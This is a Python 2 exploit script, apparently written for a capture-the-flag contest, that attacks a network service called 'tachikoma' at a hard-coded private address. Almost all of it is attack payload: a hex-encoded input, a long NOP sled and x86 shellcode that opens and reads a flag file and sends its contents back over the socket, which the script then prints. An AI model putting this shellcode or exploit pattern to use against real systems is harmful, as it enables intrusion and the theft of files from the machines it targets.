import socket
import struct
import time
import telnetlib
import os
import sys

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def exploit(host, port):
	ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss.connect((host, port))
	f = ss.makefile('rw', bufsize=0)

	body = '0a526f626f744465746563740a7b0a202020207072696e74282022466f756e6420726f626f7422205f64746362656172696e67202268656164696e6722205f64746368656164696e67202264697374616e636522205f64746364697374616e63652022656e6572677922205f647463656e6572677920290a202020207072696e74282022526164617222205f726164617261696d202267756e22205f67756e61696d20290a20202020466972696e67203d20310a2020202044697374616e6365203d205f64746364697374616e63650a0a2020202023706f696e7420726164617220617420726f626f740a20202020696628205f64746362656172696e67203c203020290a202020202020202061627328205f64746362656172696e6720290a202020202020202072616461726c65667428205f726573756c7420290a20202020656c73650a20202020202020207261646172726967687428205f64746362656172696e6720290a20202020656e6469660a0a2020202023706f696e747b0a20726567636f67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e67203d205f67756e61696d202d205f7261909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
	body += '9090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
	body += '9090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
	body += '909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
	body += 'eb175983e91031db31c0b003ba9999999981f299899999cd80e8e4ffffff0a7d'
#body += 'cc' * 0x1000
	body = body.decode('hex')
#


	head = '1\n%d\n' % len(body)
	s = head + body
	next_s = '9090909090909090909090909090909090909090909090909090909090909090e8160000002f686f6d652f666c6167732f74616368696b6f6d61005b31c9b805000000cd8089c389e1ba00100000b803000000cd8089c289e1bb01000000b804000000cd80b801000000cd80'.decode('hex')
	s += next_s

	f.write(s)
	readuntil(f, '_gung\n')
	flag = f.read(26).strip()
	print flag
	return flag

	t = telnetlib.Telnet()
	t.sock = ss
	t.interact()

if __name__ == '__main__':
    exploit('192.168.165.135', 9)
